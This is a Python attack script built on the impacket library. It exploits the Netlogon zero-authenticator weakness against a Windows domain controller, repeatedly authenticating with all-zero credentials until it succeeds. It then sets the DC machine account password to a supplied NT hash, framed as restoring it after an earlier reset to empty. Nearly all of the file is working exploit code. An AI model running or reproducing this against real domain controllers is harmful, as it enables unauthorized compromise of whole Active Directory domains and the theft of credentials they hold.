#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.dcerpc.v5.ndr import NDRCALL
import impacket

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
from Cryptodome.Cipher import DES, AES, ARC4
from struct import pack, unpack

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName',nrpc.PLOGONSRV_HANDLE),
        ('AccountName',nrpc.WSTR),
        ('SecureChannelType',nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName',nrpc.WSTR),
        ('Authenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword',nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )

class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode',nrpc.NTSTATUS),
    )

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer, originalpw):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  plaintext = b'\x00'*8
  ciphertext = b'\x00'*8
  flags = 0x212fffff

  # Send challenge and authentication request.
  serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  serverChallenge = serverChallengeResp['ServerChallenge']
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    print()
    server_auth.dump()
    print("server challenge", serverChallenge)
    sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
    print("session key", sessionKey)

    try:
      IV=b'\x00'*16
      #Crypt1 = AES.new(sessionKey, AES.MODE_CFB, IV)
      #serverCred = Crypt1.encrypt(serverChallenge)
      #print("server cred", serverCred)
      #clientCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
      #clientCred = clientCrypt.encrypt(b'\x00'*8)
      #print("client cred", clientCred)
      #timestamp_var = 10
      #clientStoredCred =  pack('<Q', unpack('<Q', b'\x00'*8)[0] + timestamp_var)
      #print("client stored cred", clientStoredCred)
      authenticator = nrpc.NETLOGON_AUTHENTICATOR()
      #authenticatorCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
      #authenticatorCred = authenticatorCrypt.encrypt(clientStoredCred);
      #print("authenticator cred", authenticatorCred)
      authenticator['Credential'] = ciphertext #authenticatorCred
      authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
      #request = nrpc.NetrLogonGetCapabilities()
      #request['ServerName'] = '\x00'*20
      #request['ComputerName'] = target_computer + '\x00'
      #request['Authenticator'] = authenticator
      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
      #request['ReturnAuthenticator']['Timestamp'] = 0 
      #request['QueryLevel'] = 1
      #resp = rpc_con.request(request)
      #resp.dump()

      nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
      nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
      
      request = NetrServerPasswordSet()
      request['PrimaryName'] = NULL
      request['AccountName'] = target_computer + '$\x00'
      request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
      request['ComputerName'] = target_computer + '\x00'
      request["Authenticator"] = authenticator
      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
      #request['ReturnAuthenticator']['Timestamp'] = 0
      pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(originalpw), sessionKey)
      request["UasNewPassword"] = pwdata
      resp = rpc_con.request(request)
      resp.dump()

      #request['PrimaryName'] = NULL
      #request['ComputerName'] = target_computer + '\x00'
      #request['OpaqueBuffer'] = b'HOLABETOCOMOANDAS\x00'
      #request['OpaqueBufferSize'] = len(b'HOLABETOCOMOANDAS\x00')
      #resp = rpc_con.request(request)
      #resp.dump()      
    except Exception as e:
      print(e)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    #print(ex)
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer, originalpw):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer, originalpw)
    
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC machine account should be restored to it\'s original value. You might want to secretsdump again to check.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (4 <= len(sys.argv) <= 5):
    print('Usage: reinstall_original_pw.py <dc-name> <dc-ip> <hexlified original nthash>\n')
    print('Reinstalls a particular machine hash for the machine account on the target DC. Assumes the machine password has previously been reset to the empty string')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip, originalpw] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name, originalpw)

